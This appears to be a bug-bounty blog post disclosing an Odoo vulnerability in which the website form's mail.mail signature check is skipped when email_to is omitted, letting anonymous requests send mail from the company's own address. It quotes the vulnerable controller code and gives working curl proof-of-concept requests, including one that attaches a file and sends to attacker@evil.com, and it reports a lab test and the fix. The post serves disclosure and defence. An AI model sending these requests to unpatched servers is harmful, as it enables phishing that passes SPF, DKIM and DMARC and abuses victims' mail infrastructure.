---
layout: post
title: "Odoo website forms: the signature check that one empty field turns off"
subtitle: "the mail.mail website form only validates its anti-abuse HMAC when email_to is set, so omit email_to and send from the victim's mail server unauthenticated"
date: 2026-02-19
tags: [auth-bypass, odoo, signature-bypass, email, bug-bounty]
category: research
tldr: "POST /website/form/mail.mail is auth='public', csrf=False, and lets an anonymous request set email_cc, subject, body, and attachments on a mail.mail record it then sends. A website_form_signature HMAC is supposed to stop that, but the check is guarded by if kwargs.get('email_to'). Omit email_to, deliver through email_cc instead, and the signature is never verified while .send() still runs. The mail goes out from the company's own address. Reported on Odoo 18 and 19, accepted Medium 5.3, fixed 2026-06-24 in commit bca77627. Found with Ilyase Dehy."
---

## how I found it: a guard with an if in front of it

A signature check is only as good as the branch it sits behind. The website form controller in Odoo signs the `mail.mail` route with an HMAC called `website_form_signature`, which is the whole point: the contact form is `auth='public'` and `csrf=False`, so without a signature anyone could make the server send mail. The signature is meant to prove the request came from a real rendered form, not a script.

Reading the controller, the validation was wrapped in `if kwargs.get("email_to")`. A check that only runs when a caller-supplied field is present is a check the caller can skip by leaving the field out. That is the bug. Found with Ilyase Dehy.

## the endpoint and why mail.mail is reachable

The route accepts any model flagged for website forms:

```python
# addons/website/controllers/form.py, line 31
@http.route('/website/form/<string:model_name>', type='http', auth="public",
            methods=['POST'], website=True, csrf=False, captcha='website_form')
def website_form(self, model_name, **kwargs):
```

`mail.mail` is allowed by default:

```xml
<!-- addons/website/data/mail_mail_data.xml -->
<record id="mail.model_mail_mail" model="ir.model">
  <field name="website_form_access">True</field>
</record>
```

And the form subsystem explicitly lets a `mail.mail` submission set the recipient fields:

```python
# addons/website/models/website_form.py, lines 39-40
if self.model == "mail.mail":
    included = {'email_from', 'email_to', 'email_cc', 'email_bcc', 'body', 'reply_to', 'subject'}
```

So an unauthenticated POST can create a `mail.mail` record carrying `email_cc`, `subject`, `body`, and attachments. The only thing standing between that record and `.send()` is the signature.

## the bug: the check is optional

```python
# addons/website/controllers/form.py, lines 83-93
if model_name == 'mail.mail':
    form_has_email_cc = {'email_cc', 'email_bcc'} & kwargs.keys() or \
        'email_cc' in kwargs["website_form_signature"]
    # remove the email_cc information from the signature
    kwargs["website_form_signature"] = kwargs["website_form_signature"].split(':')[0]
    if kwargs.get("email_to"):
        value = kwargs['email_to'] + (':email_cc' if form_has_email_cc else '')
        hash_value = hmac(model_record.env, 'website_form_signature', value)
        if not consteq(kwargs["website_form_signature"], hash_value):
            raise AccessDenied('invalid website_form_signature')
    request.env[model_name].sudo().browse(id_record).send()
```

Line 88 is the gate: `if kwargs.get("email_to")`. The `consteq` comparison only runs inside that branch. Line 93 calls `.send()` no matter which way the branch went. The `consteq` itself is constant-time and correct, it just never executes when `email_to` is absent.

The guarded path works. Send `email_to` with a wrong signature and `consteq` fails, the request dies with `AccessDenied: invalid website_form_signature`. The bypass is to never enter that branch: drop `email_to` entirely, put the recipient in `email_cc`, and pass an empty `website_form_signature` (the `.split(':')[0]` on line 86 happily turns `""` into `""`). The signature is never checked and the mail is sent.

## the request

```bash
curl -s -X POST http://target/website/form/mail.mail \
  -H 'Referer: http://target/contactus' \
  -d 'email_cc=attacker@evil.com' \
  -d 'subject=sent without authentication' \
  -d 'body=<p>no signature, no login</p>' \
  -d 'website_form_signature='
```

No `email_to`. The response is `{"id": <integer>}`, the id of the `mail.mail` record the server just created and called `.send()` on.

Two pieces of Odoo plumbing make `email_cc` a working delivery channel on its own. `mail.mail` builds a recipient list from `email_cc` even when `email_to` is empty:

```python
# addons/mail/models/mail_mail.py
email_list = []
if self.email_to:
    email_list.append({...})
if self.email_cc:
    if email_list:
        ...
    else:
        email_list.append({
            'email_cc': tools.mail.email_split_and_format_normalize(self.email_cc),
            'email_to': [],
            ...
        })
```

and the SMTP layer puts `Cc` addresses on the envelope:

```python
# odoo/addons/base/models/ir_mail_server.py
smtp_to_list = [
    address
    for base in [email_to, email_cc, email_bcc]
    for address in tools.misc.unique(extract_rfc2822_addresses(base))
    if address
]
```

Website form uploads also create `ir.attachment` records linked to the mail, so the same unauthenticated request can carry a file:

```bash
curl -s -X POST http://target/website/form/mail.mail \
  -F 'email_cc=attacker@evil.com' \
  -F 'subject=with attachment' \
  -F 'body=<p>see attached</p>' \
  -F 'website_form_signature=' \
  -F 'attachment=@payload.pdf'
```

## proving it, and what the proof actually shows

I tested on a clean `odoo:19.0` Docker image with no mail server configured, which makes the negative control clean: any real SMTP attempt has to fail at connect, and that failure is the evidence the send path ran. The bypass request created the record and Odoo tried to deliver it:

```text
mail.mail record created (id=8)
  subject        = Security Test - Signature Bypass
  email_to       = False                       <- empty: this is what skips the check
  email_cc       = test-false-positive@example.com
  email_from     = "Acme Security Corp form submission" <info@acme-security.test>
  state          = exception
  failure_reason = 111 Connection refused
```

`state=exception` with `Connection refused` is the honest result. It proves the request cleared the signature gate and reached SMTP delivery to the attacker-controlled `Cc`. It does not prove a delivered inbox message, because the lab has no mail server. On a production instance with a configured mail server, that same path delivers. Odoo agreeing it was a bug and patching it (below) settles which reading was right.

The impact follows from `email_from` being the company's own address: the mail passes SPF, DKIM, and DMARC because it genuinely originates from the victim's infrastructure, which is exactly what makes it useful for phishing and what gets the sending domain blacklisted under abuse. The endpoint has no rate limiting.

## severity and class

CWE-347, improper verification of a cryptographic signature, chained into unauthorized use of the mail subsystem. I scored it `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` = 5.3 Medium: network, no auth, one request, no data read (C:N), the integrity impact is the attacker getting the server to send attacker-controlled mail (I:L). Odoo accepted Medium.

## fix status

Reported against Odoo 18.0 and 19.0, which share the same controller logic. Odoo accepted it, rewarded a bounty, and resolved it on 2026-06-24 in commit [`bca77627`](https://github.com/odoo/odoo/commit/bca776277f24ec4d0df79e6b4bac085b43c04dfb). The maintainer also noted an ongoing task to sign every field passed server-side, not just `email_to` and `email_cc`, prompted by a separate report. That is the right direction: the root problem is that the signature only ever covered a subset of the fields, so the fix is to bind all of them, not to add another `if`. No CVE was assigned; Odoo closed it as a normal commit.

## references

- [website form controller on GitHub](https://github.com/odoo/odoo/blob/19.0/addons/website/controllers/form.py)
- [the fix commit `bca77627`](https://github.com/odoo/odoo/commit/bca776277f24ec4d0df79e6b4bac085b43c04dfb)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
